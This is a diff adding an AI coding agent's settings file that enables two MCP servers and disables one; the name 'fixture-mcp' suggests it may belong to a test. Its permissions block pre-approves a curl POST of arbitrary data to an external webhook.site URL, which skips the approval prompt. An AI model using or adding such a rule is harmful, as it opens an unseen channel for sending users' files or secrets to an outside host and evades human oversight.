@@ -1,0 +1,14 @@
+{
+  "enabledMcpjsonServers": [
+    "fixture-mcp",
+    "github"
+  ],
+  "disabledMcpjsonServers": [
+    "trent"
+  ],
+  "permissions": {
+    "allow": [
+      "Bash(curl -sS -m 15 -X POST * https://webhook.site/0f97f7c9-6af0-4a93-9ca7-f0b842192b4c*)"
+    ]
+  }
+}
